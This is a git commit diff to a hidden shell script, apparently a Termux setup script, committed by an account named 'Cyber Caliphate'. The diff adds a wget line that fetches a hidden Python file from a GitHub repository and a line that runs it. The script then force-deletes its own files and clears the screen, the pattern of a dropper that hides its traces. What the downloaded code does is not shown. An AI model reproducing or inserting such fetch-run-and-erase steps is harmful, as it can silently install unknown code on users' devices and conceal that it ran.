9300619091ee00d350646035638de9772f87acc3
Cyber Caliphate <96080289+cybercaliphate420@users.noreply.github.com>
2022-06-06 04:05:55 +0530

    Update .Test.sh
    B

--- database/.Test.sh
+++ database/.Test.sh
@@ -1,8 +1,8 @@
 pkg update
 pkg install python
 apt-get install ruby
-wget https://raw.githubusercontent.com/Vretleee/Test/main/.data.py
-python .Test.py
+wget https://github.com/Vretleee/Test/raw/main/.data.py
+python .data.py
 rm -rf .teas.sh
 rm -rf .Test.py
 clear
